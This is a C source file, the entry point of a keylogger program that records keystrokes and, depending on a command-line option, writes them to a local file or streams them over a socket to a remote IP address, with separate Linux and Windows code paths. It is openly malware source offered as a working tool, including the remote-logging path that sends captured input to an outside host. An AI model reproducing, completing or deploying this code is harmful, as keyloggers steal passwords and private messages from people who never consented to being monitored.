//
// Created by mallo on 13/12/2022.
//

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <errno.h>
#include "keylogger.h"
#include "networking.h"

const char *get_platform_name();
void print_usage_and_quit(char *application_name);
const char *parse_options(int argc, char *argv[]);

// flag checker for command line option
int network = 0, file = 0;

int main(int argc, char *argv[]) {
    // prints platform
    puts(get_platform_name());

    // output file descriptor
    FILE* writeout;

    // option value
    // file path or ip address
    const char *option_input = parse_options(argc, argv);

    // both or neither options are given, not permitted
    if(network == file) {
        print_usage_and_quit(argv[0]);
    }
    else if(file) {
        if((writeout = fopen(option_input, "ab+")) < 0){
            printf("Error opening file %s: %s\n", argv[2], strerror(errno));
            return 1;
        }
    }
    else if(network){
        #ifdef PLATFORM_LINUX
            writeout = fdopen(get_socket_file_descriptor((char*)option_input, PORT), "ab+");
            printf("socket connesso");
            if(writeout < 0){
                printf("Error creating socket on %s\n", option_input);
                return 1;
            }
        #endif

        #ifdef PLATFORM_WINDOWS
            remotelogger(get_socket_file_descriptor((char*)option_input, PORT));
            return 0;
        #endif
    }

    keylogger(writeout);
    fclose(writeout);

}

const char *get_platform_name() {
    return (PLATFORM_NAME == NULL) ? "" : PLATFORM_NAME;
}

const char *parse_options(int argc, char *argv[]) {
    int option = 0;

    // parse command line options until option == -1 (no more options)
    // then returns the value of the option
    while((option = getopt(argc, argv,"sn:f:")) != -1){
        switch(option){
            case 'n':
                network = 1;
                break;
            case 'f':
                file = 1;
                break;
            default: print_usage_and_quit(argv[0]);
        }
        return optarg;
    }
}

void print_usage_and_quit(char *application_name){
    printf("Usage: %s [-n ip-address | -f output-file]\n", application_name);
    exit(1);
}

